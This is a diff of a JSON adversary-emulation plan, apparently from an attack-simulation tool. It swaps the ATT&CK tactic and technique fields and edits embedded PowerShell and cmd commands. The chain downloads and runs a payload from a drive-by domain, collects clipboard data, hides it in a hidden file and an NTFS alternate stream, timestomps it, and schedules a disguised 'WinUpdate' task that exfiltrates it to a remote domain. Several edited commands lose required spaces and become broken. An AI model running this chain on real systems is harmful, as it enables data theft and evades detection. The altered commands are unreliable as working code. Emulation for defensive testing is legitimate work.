@@ -9,16 +9,16 @@
     },
     "procedures": [
         {
-            "tactic": "Actuator",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
                 "tool": "self.tool",
@@ -27,8 +27,8 @@
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS",
             "preconditions": {
                 "tool": "self.tool",
@@ -37,8 +37,8 @@
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
                 "self.tool_name": "self.tool",
@@ -49,24 +49,24 @@
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces2",
             "preconditions": {
                 "driveby": "self.driveby2"
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS2",
             "preconditions": {
                 "driveby": "self.driveby2"
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX2",
             "preconditions": {
                 "payload": "about.js",
@@ -75,16 +75,16 @@
             }
         },
         {
-            "tactic": "PayloadCheapride",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
             }
         },
         {
-            "tactic": "DriveByCompromise",
-            "technique": "InitialAccess",
+            "tactic": "InitialAccess",
+            "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -94,8 +94,8 @@
             }
         },
         {
-            "tactic": "UserExecution",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -105,8 +105,8 @@
             }
         },
         {
-            "tactic": "WebProtocols",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -120,60 +120,60 @@
             }
         },
         {
-            "tactic": "IngressToolTransfer",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "IngressToolTransfer",
             "label": "fileDownload",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "powershell &{invoke-webrequest http://${self.driveby_domain2}/${self.tool_name2} -O ${self.temp_dir_name}\\${self.tool_name2}; echo \" \"}"
+                    "command": "powershell &{invoke-webrequest http://${self.driveby_domain2}/${self.tool_name2}-O${self.temp_dir_name}\\${self.tool_name2}; echo \" \"}"
                 }
             }
         },
         {
-            "tactic": "SystemNetworkConfigurationDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemNetworkConfigurationDiscovery",
             "label": "fileAndNetwork",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "cmd /c wscript ${self.temp_dir_name}\\${self.tool_name2} && echo \" \""
+                    "command": "cmd /c wscript${self.temp_dir_name}\\${self.tool_name2}&& echo \" \""
                 }
             }
         },
         {
-            "tactic": "ClipboardData",
-            "technique": "Collection",
+            "tactic": "Collection",
+            "technique": "ClipboardData",
             "label": "clipboardData",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "powershell Get-Clipboard >> ${self.temp_dir_name}\\license.rtf; echo \" \""
+                    "command": "powershell Get-Clipboard >>${self.temp_dir_name}\\license.rtf; echo \" \""
                 }
             }
         },
         {
-            "tactic": "HiddenFilesAndDirectories",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "HiddenFilesAndDirectories",
             "label": "hiddenFilesAndDirectories",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "cmd /c attrib +H ${self.temp_dir_name}\\license.rtf && echo \" \""
+                    "command": "cmd /c attrib +H${self.temp_dir_name}\\license.rtf && echo \" \""
                 }
             }
         },
         {
-            "tactic": "ScreenCapture",
-            "technique": "Collection",
+            "tactic": "Collection",
+            "technique": "ScreenCapture",
             "label": "screenCapture",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -185,47 +185,47 @@
             }
         },
         {
-            "tactic": "NtfsFileAttributes",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "NtfsFileAttributes",
             "label": "ntfsFileAttributes",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "powershell $data = [convert]::ToBase64String((Get-Content ${self.temp_dir_name}\\~temp482 -Encoding byte)); Set-Content ${self.temp_dir_name}\\license.rtf -Stream \"hidden\" -value $data; echo \" \""
+                    "command": "powershell $data = [convert]::ToBase64String((Get-Content${self.temp_dir_name}\\~temp482 -Encoding byte)); Set-Content${self.temp_dir_name}\\license.rtf -Stream \"hidden\" -value $data; echo \" \""
                 }
             }
         },
         {
-            "tactic": "TimeStomp",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "TimeStomp",
             "label": "timeStomp",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "powershell &{$NewDate = (Get-Date '01/01/1969 01:01am'); $TSFile = gci -hidden ${self.temp_dir_name}\\license.rtf; $TSFile.LastWriteTime = $NewDate; $TSFile.CreationTime = $NewDate; $TSFile.LastAccessTime = $NewDate; echo \" \"}"
+                    "command": "powershell &{$NewDate = (Get-Date '01/01/1969 01:01am'); $TSFile = gci -hidden${self.temp_dir_name}\\license.rtf; $TSFile.LastWriteTime = $NewDate; $TSFile.CreationTime = $NewDate; $TSFile.LastAccessTime = $NewDate; echo \" \"}"
                 }
             }
         },
         {
-            "tactic": "ScheduledTransfer",
-            "technique": "Exfiltration",
+            "tactic": "Exfiltration",
+            "technique": "ScheduledTransfer",
             "label": "exfiltrate",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "powershell $time = [DateTime]::Now.AddMinutes(30); $hourMinute=$time.ToString(\"HH:mm\"); SchTasks.exe /Create /SC ONCE /TN \"WinUpdate\", /TR \"powershell Invoke-RestMethod -Uri http://${self.exfil_domain} -Method Post -InFile ${self.temp_dir_name}\\license.rtf\" /ST $hourMinute /F; echo \" \""
+                    "command": "powershell $time = [DateTime]::Now.AddMinutes(30); $hourMinute=$time.ToString(\"HH:mm\"); SchTasks.exe /Create /SC ONCE /TN \"WinUpdate\", /TR \"powershell Invoke-RestMethod -Uri http://${self.exfil_domain}-Method Post -InFile${self.temp_dir_name}\\license.rtf\" /ST $hourMinute /F; echo \" \""
                 }
             }
         },
         {
-            "tactic": "InternalDefacement",
-            "technique": "Impact",
+            "tactic": "Impact",
+            "technique": "InternalDefacement",
             "label": "internalDefacement",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -234,8 +234,8 @@
             }
         },
         {
-            "tactic": "AgentExit",
-            "technique": "Utility",
+            "tactic": "Utility",
+            "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
                 "agent": "self.agent_tgt1",
